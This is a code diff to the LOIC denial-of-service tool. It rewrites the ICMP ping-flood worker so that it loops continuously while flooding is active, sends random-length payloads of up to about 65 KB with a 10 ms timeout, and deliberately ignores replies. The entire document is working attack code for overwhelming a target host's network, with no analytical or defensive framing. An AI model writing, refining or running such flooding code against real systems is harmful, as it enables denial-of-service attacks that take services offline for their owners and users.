@@ -593,60 +593,69 @@ namespace LOIC
         //while working away
         private  void bw_DoWork (object sender, EventArgs e){
 
-            if (_RandomMessage)
+            while (this.IsFlooding)
             {
-                //fill an array with 65499 random bytes bytes 
-                int b = 0;
-                while (b < 64999)
+
+                if (_RandomMessage)
                 {
-                    this._BytesToSend[b] = Convert.ToByte(this._random.Next(0, 255));
-                    b++;
+                    //fill an array with 0 to 65499 random bytes bytes 
+                    int b = 0;
+                    while (b < _random.Next(0,65499))
+                    {
+                        this._BytesToSend[b] = Convert.ToByte(this._random.Next(0, 255));
+                        b++;
+                    }
                 }
-            }
-            else
-            {
-                _BytesToSend = new Byte[0];
-            }
-            
-        
-            
-            
-           PingOptions opt = new PingOptions();
-            opt.DontFragment = false;
-            opt.Ttl = 128;
+                else
+                {
+                    _BytesToSend = new Byte[0];
+                }
 
 
-            for (int i = 0; i < _PingsPerThread; i++)
-            {
-                try
-                {
 
-                    //send the data with a timeout value of 10ms 
-                    _pingSender.SendAsync(_ip , 10, _BytesToSend, opt);
-                    
-                }
-                catch (PingException)
+
+                PingOptions opt = new PingOptions();
+                opt.DontFragment = false;
+                opt.Ttl = 128;
+                State = ReqState.Ready;
+
+                for (int i = 0; i < _PingsPerThread; i++)
                 {
-                    
-                    //if not working for whatever reason this will show this.
-                    
-                    
-                }
-                catch(Exception){
-                    
-                    Failed++;
-                }
+                    State = ReqState.Connecting;
+                    try
+                    {
+
+                        //send the data with a timeout value of 10ms 
+                        _pingSender.SendAsync(_ip, 10, _BytesToSend, opt);
+                        Requested++;
+
+                    }
+                    catch (PingException)
+                    {
+
+                        //if not working for whatever reason this will show this.
+                        Failed++;
+
+                    }
+                    catch (Exception)
+                    {
+                        Failed++;
+                    }
                     //dispose of the pingSender because why do WE need to see the replies ;)
-                try
-                {
-                    _pingSender.Dispose();
-                    Requested++;
+                    try
+                    {
+                        _pingSender.SendAsyncCancel();
+                        _pingSender.Dispose();
+                        Requested++;
+                    }
+                    catch { }
+                    State = ReqState.Completed;
                 }
-                catch { }
+
+                State = ReqState.Ready;
+
+
             }
-
-           
-
         
           
         }
